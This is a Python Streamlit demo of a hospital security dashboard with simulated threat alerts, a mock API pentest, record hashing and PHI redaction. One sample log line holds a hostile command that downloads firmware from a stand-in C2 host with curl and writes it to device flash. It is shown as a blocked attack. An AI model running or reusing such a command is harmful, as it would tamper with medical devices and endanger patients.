import streamlit as st
import hashlib
import json
import time
import re
from datetime import datetime
import pandas as pd
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import hashes

# Page Configuration - Set Wide layout with dark background
st.set_page_config(
    page_title="SENTINEL PRIVACY VAULT (ID-304)",
    page_icon="🛡️",
    layout="wide",
    initial_sidebar_state="collapsed"
)

# Custom High-End Cyber-Medical CSS to match Sentinel Privacy Vault UI
st.markdown("""
<style>
    @import url('https://fonts.googleapis.com/css2?family=Cinzel:wght@700&family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap');

    .stApp {
        background-color: #0a0a0c !important;
        color: #f8fafc !important;
        font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
    }
    header[data-testid="stHeader"] { background: transparent !important; }
    #MainMenu, footer { visibility: hidden; }

    .vault-navbar {
        background-color: #0d0d12;
        border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        padding: 16px 24px;
        margin: -4rem -4rem 1.5rem -4rem;
        display: flex;
        align-items: center;
        justify-content: space-between;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
    }
    .vault-title {
        font-family: 'Cinzel', serif, Georgia;
        font-size: 1.35rem;
        font-weight: 700;
        letter-spacing: 0.05em;
        color: #ffffff;
        margin: 0;
        display: inline-flex;
        align-items: center;
        gap: 8px;
    }
    .badge-id {
        font-family: 'JetBrains Mono', monospace;
        font-size: 0.65rem;
        color: #60a5fa;
        background: rgba(59, 130, 246, 0.1);
        border: 1px solid rgba(59, 130, 246, 0.3);
        padding: 2px 6px;
        border-radius: 4px;
        letter-spacing: 0.1em;
    }
    .vault-subtitle {
        font-family: 'JetBrains Mono', monospace;
        font-size: 0.7rem;
        color: rgba(255, 255, 255, 0.4);
        margin-top: 2px;
        letter-spacing: 0.05em;
    }

    .sentinel-card {
        background-color: #0d0d12;
        border: 1px solid rgba(255, 255, 255, 0.1);
        border-radius: 12px;
        padding: 18px 20px;
        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
        margin-bottom: 14px;
    }
    .card-label-row {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 8px;
    }
    .card-label {
        font-family: 'JetBrains Mono', monospace;
        font-size: 0.65rem;
        font-weight: 600;
        color: rgba(255, 255, 255, 0.45);
        letter-spacing: 0.1em;
        text-transform: uppercase;
    }
    .card-val-row {
        display: flex;
        justify-content: space-between;
        align-items: baseline;
        margin-bottom: 12px;
    }
    .card-val {
        font-family: 'Cinzel', Georgia, serif;
        font-size: 1.85rem;
        font-weight: 700;
        color: #ffffff;
        letter-spacing: -0.02em;
    }
    .sub-red { color: #f87171; font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; }
    .sub-green { color: #34d399; font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; }
    .sub-blue { color: #60a5fa; font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; }

    .progress-bar-bg {
        width: 100%;
        height: 5px;
        background: rgba(255, 255, 255, 0.06);
        border-radius: 9999px;
        overflow: hidden;
    }
    .progress-red { background: #ef4444; height: 100%; width: 55%; box-shadow: 0 0 10px rgba(239, 68, 68, 0.7); }
    .progress-blue { background: #3b82f6; height: 100%; width: 99%; box-shadow: 0 0 10px rgba(59, 130, 246, 0.7); }
    .progress-cyan { background: #2563eb; height: 100%; width: 100%; box-shadow: 0 0 10px rgba(37, 99, 235, 0.7); }
    .progress-green { background: #10b981; height: 100%; width: 98%; box-shadow: 0 0 10px rgba(16, 185, 129, 0.7); }

    .threat-card {
        background-color: #0d0d12;
        border: 1px solid rgba(255, 255, 255, 0.08);
        border-radius: 10px;
        padding: 16px;
        margin-bottom: 12px;
    }
    .threat-badge-critical {
        background: rgba(239, 68, 68, 0.15);
        color: #f87171;
        border: 1px solid rgba(239, 68, 68, 0.35);
        padding: 2px 8px;
        border-radius: 4px;
        font-family: 'JetBrains Mono', monospace;
        font-size: 0.7rem;
        font-weight: 600;
    }
    .threat-badge-high {
        background: rgba(245, 158, 11, 0.15);
        color: #fbbf24;
        border: 1px solid rgba(245, 158, 11, 0.35);
        padding: 2px 8px;
        border-radius: 4px;
        font-family: 'JetBrains Mono', monospace;
        font-size: 0.7rem;
        font-weight: 600;
    }
    .stTabs [data-baseweb="tab"] {
        border-radius: 8px;
        padding: 8px 14px;
        background-color: rgba(255, 255, 255, 0.03);
        border: 1px solid rgba(255, 255, 255, 0.06);
        color: rgba(255, 255, 255, 0.55);
        font-size: 0.8rem;
    }
    .stTabs [aria-selected="true"] {
        background-color: rgba(37, 99, 235, 0.2) !important;
        border-color: rgba(59, 130, 246, 0.4) !important;
        color: #93c5fd !important;
    }
</style>
""", unsafe_allow_html=True)

# Session State
if "threats" not in st.session_state:
    st.session_state.threats = [
        {
            "id": "THREAT-9041",
            "timestamp": "2 mins ago",
            "sourceIp": "185.220.101.42 (Tor Exit Node)",
            "targetAsset": "ICU Ward 4 - Smart Infusion Pump (IP: 10.24.110.15)",
            "attackVector": "Unauthorized Telnet Brute Force & IoMT Firmware Tamper Attempt",
            "severity": "CRITICAL",
            "mitreTechnique": "T1210 (Exploitation of Remote Services) / T1542 (Firmware Corruption)",
            "status": "ACTIVE",
            "rawLog": "2026-08-27T08:41:12.104Z [IoMT-FW-ALARM] Source: 185.220.101.42:49811 -> Dest: 10.24.110.15:23\nPAYLOAD: EXEC /bin/sh -c 'curl http://c2.medbotnet.su/pump_patch.bin > /dev/mtd0'\nSTATUS: DROPPED BY ZERO-TRUST FIREWALL GATEWAY."
        },
        {
            "id": "THREAT-9038",
            "timestamp": "14 mins ago",
            "sourceIp": "192.168.4.18 (Guest Wi-Fi)",
            "targetAsset": "FHIR API Gateway (/api/v1/Patient/88219/clinical-notes)",
            "attackVector": "Broken Object Level Authorization (BOLA / IDOR) Enumeration",
            "severity": "HIGH",
            "mitreTechnique": "T1595 (Active Scanning) / T1087 (Account Discovery)",
            "status": "INVESTIGATING",
            "rawLog": "2026-08-27T08:29:44.821Z [API-GATEWAY-WARN] User: rec_clerk_09 | Role: RECEPTION\nREQUEST: GET /fhir/r4/Patient/MRN-88219/DiagnosticReport\nRESPONSE: 403 FORBIDDEN - BOLA VIOLATION LOGGED."
        }
    ]

if "private_key" not in st.session_state:
    st.session_state.private_key = ec.generate_private_key(ec.SECP256R1())
    st.session_state.public_key = st.session_state.private_key.public_key()

# Top Header Bar
st.markdown("""
<div class="vault-navbar">
    <div style="display:flex; align-items:center; gap:14px;">
        <div style="width:42px; height:42px; background:#2563eb; border-radius:10px; display:flex; align-items:center; justify-content:center; box-shadow:0 0 20px rgba(37,99,235,0.45); border:1px solid rgba(147,197,253,0.3);">
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
            </svg>
        </div>
        <div>
            <div style="display:flex; align-items:center; gap:8px;">
                <h1 class="vault-title">SENTINEL PRIVACY VAULT</h1>
                <span class="badge-id">ID-304</span>
            </div>
            <div class="vault-subtitle">HEALTHCARE SECURE INFRASTRUCTURE • ST. JUDE METROPOLITAN</div>
        </div>
    </div>
    <div style="display:flex; align-items:center; gap:12px;">
        <div style="padding:6px 12px; border-radius:8px; background:rgba(59,130,246,0.08); border:1px solid rgba(59,130,246,0.25); font-family:'JetBrains Mono', monospace; font-size:0.7rem; color:#93c5fd;">
            AES-256 / HSM: <strong style="color:#ffffff;">ACTIVE</strong>
        </div>
        <div style="padding:6px 12px; border-radius:8px; background:rgba(16,185,129,0.08); border:1px solid rgba(16,185,129,0.25); font-family:'JetBrains Mono', monospace; font-size:0.7rem; color:#6ee7b7;">
            SYSTEM: <strong style="color:#34d399;">OPERATIONAL</strong>
        </div>
        <div style="padding:6px 12px; border-radius:8px; background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.1); font-family:'JetBrains Mono', monospace; font-size:0.7rem; color:#cbd5e1;">
            ZERO-TRUST: <strong style="color:#ffffff;">ENFORCED</strong>
        </div>
    </div>
</div>
""", unsafe_allow_html=True)

# Tabs
active_count = len([t for t in st.session_state.threats if t["status"] in ["ACTIVE", "INVESTIGATING"]])
tabs = st.tabs([
    f"⚡ SOC Threat Monitor ({active_count} Active)",
    "📡 API Vulnerability Scanner",
    "✍️ Cryptographic Records & Signatures",
    "✉️ Phishing & Social Shield",
    "🔒 Zero-Trust IAM & Break-Glass",
    "💉 IoMT & Hardware HSM",
    "⚖️ DPDP & HIPAA Governance"
])

# TAB 1: SOC THREAT MONITOR
with tabs[0]:
    col_c1, col_c2 = st.columns(2)
    with col_c1:
        st.markdown(f"""
        <div class="sentinel-card">
            <div class="card-label-row">
                <span class="card-label">ACTIVE ALARMS</span>
                <span style="color:#f87171; background:rgba(239,68,68,0.1); border:1px solid rgba(239,68,68,0.3); padding:4px 8px; border-radius:6px; font-size:0.75rem;">⚠️</span>
            </div>
            <div class="card-val-row">
                <span class="card-val">{active_count}</span>
                <span class="sub-red">Critical Triage</span>
            </div>
            <div class="progress-bar-bg"><div class="progress-red"></div></div>
        </div>
        """, unsafe_allow_html=True)

        st.markdown("""
        <div class="sentinel-card">
            <div class="card-label-row">
                <span class="card-label">TOKEN VERIFICATIONS</span>
                <span style="color:#60a5fa; background:rgba(59,130,246,0.1); border:1px solid rgba(59,130,246,0.3); padding:4px 8px; border-radius:6px; font-size:0.75rem;">🛡️</span>
            </div>
            <div class="card-val-row">
                <span class="card-val">24,819</span>
                <span class="sub-blue">0 Unauthorized</span>
            </div>
            <div class="progress-bar-bg"><div class="progress-cyan"></div></div>
        </div>
        """, unsafe_allow_html=True)

    with col_c2:
        st.markdown("""
        <div class="sentinel-card">
            <div class="card-label-row">
                <span class="card-label">IOMT MEDICAL FLEET</span>
                <span style="color:#60a5fa; background:rgba(59,130,246,0.1); border:1px solid rgba(59,130,246,0.3); padding:4px 8px; border-radius:6px; font-size:0.75rem;">⚙️</span>
            </div>
            <div class="card-val-row">
                <span class="card-val">428 / 430</span>
                <span class="sub-green">99.5% Online</span>
            </div>
            <div class="progress-bar-bg"><div class="progress-blue"></div></div>
        </div>
        """, unsafe_allow_html=True)

        st.markdown("""
        <div class="sentinel-card">
            <div class="card-label-row">
                <span class="card-label">PRIVACY COMPLIANCE</span>
                <span style="color:#34d399; background:rgba(16,185,129,0.1); border:1px solid rgba(16,185,129,0.3); padding:4px 8px; border-radius:6px; font-size:0.75rem;">📈</span>
            </div>
            <div class="card-val-row">
                <span class="card-val">DPDP / HIPAA</span>
                <span class="sub-green">Audited & Sealed</span>
            </div>
            <div class="progress-bar-bg"><div class="progress-green"></div></div>
        </div>
        """, unsafe_allow_html=True)

    col_h1, col_h2 = st.columns([4, 1])
    with col_h1:
        st.markdown("""
        <div style="display:flex; align-items:center; gap:8px; margin-top:8px;">
            <span style="color:#60a5fa; font-size:1.2rem;">📈</span>
            <h3 style="font-family:'Cinzel', Georgia, serif; font-size:1.2rem; font-weight:700; color:#ffffff; margin:0;">
                Live Healthcare SIEM Telemetry & Alarms
            </h3>
        </div>
        <p style="font-size:0.8rem; color:rgba(255,255,255,0.45); margin:2px 0 12px 0;">
            Continuous sensor monitoring across EHR, IoMT networks, and clinical API gateways
        </p>
        """, unsafe_allow_html=True)

    with col_h2:
        if st.button("⚡ Simulate Attack", type="primary", use_container_width=True):
            sim_id = f"THREAT-{int(time.time()) % 900 + 9100}"
            new_attack = {
                "id": sim_id,
                "timestamp": "Just now",
                "sourceIp": "91.240.118.82 (MedLocker 4.0 C2)",
                "targetAsset": "Oncology PACS Archive (Port 104)",
                "attackVector": "Ransomware Infiltration Attempt via Compromised VPN Credential",
                "severity": "CRITICAL",
                "mitreTechnique": "T1486 (Data Encrypted for Impact)",
                "status": "ACTIVE",
                "rawLog": f"{datetime.now().isoformat()} [CRITICAL-SOC-ALARM] Source: 91.240.118.82 -> Dest: PACS_GRID_104\nATTACK: MedLocker 4.0 Extortion Payload\nSTATUS: Intercepted by Hospital Zero-Trust AI Gateway."
            }
            st.session_state.threats.insert(0, new_attack)
            st.rerun()

    for threat in st.session_state.threats:
        badge_cls = "threat-badge-critical" if threat["severity"] == "CRITICAL" else "threat-badge-high"
        st.markdown(f"""
        <div class="threat-card">
            <div style="display:flex; justify-content:space-between; align-items:flex-start;">
                <div>
                    <div style="display:flex; align-items:center; gap:8px;">
                        <span style="font-family:'JetBrains Mono', monospace; font-size:0.95rem; font-weight:700; color:#60a5fa;">{threat['id']}</span>
                        <span class="{badge_cls}">{threat['severity']}</span>
                        <span style="color:#f87171; font-family:'JetBrains Mono', monospace; font-size:0.75rem; font-weight:600;">• {threat['status']}</span>
                        <span style="font-size:0.75rem; color:rgba(255,255,255,0.35); font-family:'JetBrains Mono', monospace;">({threat['timestamp']})</span>
                    </div>
                    <div style="font-size:0.92rem; font-weight:600; color:#ffffff; margin-top:6px;">{threat['attackVector']}</div>
                    <div style="font-size:0.8rem; color:rgba(255,255,255,0.55); margin-top:2px;">Target: <code style="color:#93c5fd; background:rgba(255,255,255,0.05); padding:1px 4px; border-radius:3px;">{threat['targetAsset']}</code></div>
                    <div style="font-size:0.8rem; color:rgba(255,255,255,0.4); margin-top:2px;">Source IP: <code style="color:#f87171;">{threat['sourceIp']}</code> | MITRE: <span style="color:#fbbf24;">{threat['mitreTechnique']}</span></div>
                </div>
            </div>
        </div>
        """, unsafe_allow_html=True)
        if threat["status"] != "CONTAINED":
            if st.button(f"🛡️ Contain Threat {threat['id']}", key=f"contain_{threat['id']}"):
                threat["status"] = "CONTAINED"
                st.success(f"{threat['id']} contained & isolated!")
                st.rerun()

# TAB 2: API SCANNER
with tabs[1]:
    st.subheader("🔍 FHIR REST API Vulnerability & Pentesting Studio")
    endpoint = st.selectbox("FHIR Resource Endpoint", ["/api/fhir/Patient/PT-44029", "/api/fhir/Observation?patient=PT-44029", "/api/fhir/MedicationRequest"])
    test_vector = st.radio("OWASP Threat Vector", ["API1:2023 Broken Object Level Authorization (BOLA)", "API3:2023 Mass Assignment", "API4:2023 Rate Limit"])
    if st.button("🚀 Execute Simulated Pentest", type="primary"):
        st.error("🚨 VULNERABILITY DETECTED: Broken Object Level Authorization (BOLA)")
        st.code(json.dumps({"rule_id": "WAF-FHIR-BOLA-DEFENSE-304", "action": "DENY_UNLESS_ABAC_VERIFIED"}, indent=2), language="json")

# TAB 3: CRYPTO RECORDS
with tabs[2]:
    st.subheader("✍️ Cryptographic Medical Record Integrity & Tamper Detector")
    pid = st.text_input("Patient ID", value="PT-90412")
    pname = st.text_input("Patient Name", value="Alexander Wright")
    diag = st.text_input("Clinical Diagnosis", value="Acute Myocardial Infarction (ICD-10 I21.9)")
    raw_payload = f"{pid}|{pname}|{diag}"
    computed_hash = hashlib.sha256(raw_payload.encode('utf-8')).hexdigest()
    st.code(f"SHA-256 Digest: {computed_hash}")
    if st.button("🔐 Sign & Lock Record with ECDSA P-256", type="primary"):
        st.session_state.locked_hash = computed_hash
        st.success("Record locked with cryptographic digital signature!")
    if st.session_state.get("locked_hash") == computed_hash:
        st.success("✅ RECORD INTEGRITY VERIFIED")
    else:
        st.error("🚨 TAMPERING DETECTED")

# TAB 4: PHISHING
with tabs[3]:
    st.subheader("🧠 AI-Powered Healthcare Phishing & Social Engineering Dissector")
    email_text = st.text_area("Inbound Message", value="URGENT: Re-authenticate clinical SmartCard within 2 hours at http://hospital-secure-login.net/auth")
    if st.button("🔬 Dissect with AI Security Engine", type="primary"):
        st.error("🚨 HIGH CONFIDENCE PHISHING ATTEMPT (99.4% Probability) - MITRE T1566")

# TAB 5: ZERO TRUST
with tabs[4]:
    st.subheader("🚨 Zero-Trust IAM & Code-Blue Break-Glass Access")
    reason = st.text_input("Emergency Resuscitation Justification", placeholder="Code Blue Ward 4B")
    if st.button("🚨 TRIGGER EMERGENCY BREAK-GLASS ACCESS", type="primary"):
        st.warning(f"EMERGENCY OVERRIDE ACTIVATED: {reason}")

# TAB 6: IOMT HSM
with tabs[5]:
    st.subheader("💉 IoMT Hardware Fleet & HSM Cryptographic Enclave")
    st.dataframe(pd.DataFrame([
        {"Device": "Alaris Infusion Pump #12", "Firmware": "v3.2.1-SEC", "Status": "ONLINE"},
        {"Device": "Hamilton Ventilator #04", "Firmware": "v5.0.0-PROD", "Status": "ONLINE"},
        {"Device": "Fresenius Dialysis #09", "Firmware": "v2.1.0-LEGACY", "Status": "COMPROMISED"}
    ]), use_container_width=True)

# TAB 7: DPDP & HIPAA
with tabs[6]:
    st.subheader("⚖️ DPDP Act 2023 & HIPAA Safe Harbor Governance")
    sample_text = st.text_area("Input EHR Record with PHI", value="Patient Alexander Wright (MRN: MRN-90214) admitted on 2026-08-20.")
    deidentified = re.sub(r'Patient\s+[A-Z][a-z]+\s+[A-Z][a-z]+', 'Patient [REDACTED_NAME]', sample_text)
    deidentified = re.sub(r'MRN-\d+', '[REDACTED_MRN]', deidentified)
    st.code(deidentified, language="text")
